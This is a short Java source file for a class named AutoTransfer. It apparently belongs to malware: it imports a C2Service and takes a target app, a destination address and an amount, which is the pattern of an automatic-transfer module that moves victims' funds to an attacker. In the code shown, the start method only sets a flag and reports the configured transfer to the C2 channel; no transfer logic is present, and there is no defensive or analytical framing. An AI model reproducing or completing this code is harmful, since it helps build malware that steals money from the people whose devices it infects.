package com.wuzenx.engine;

import com.wuzenx.C2Service;

public class AutoTransfer {
    private C2Service c2;
    private boolean running = false;

    public static class Config {
        public String targetApp;
        public String destinationAddress;
        public String amount;

        public Config(String targetApp, String destinationAddress, String amount) {
            this.targetApp = targetApp;
            this.destinationAddress = destinationAddress;
            this.amount = amount;
        }
    }

    public AutoTransfer(C2Service c2) {
        this.c2 = c2;
    }

    public void start(Config config) {
        running = true;
        if (c2 != null)
            c2.sendMessage("log",
                "Auto-transfer configured: " + config.targetApp +
                " -> " + config.destinationAddress +
                " (" + config.amount + ")");
    }

    public void stop() {
        running = false;
    }

    public boolean isRunning() { return running; }
}
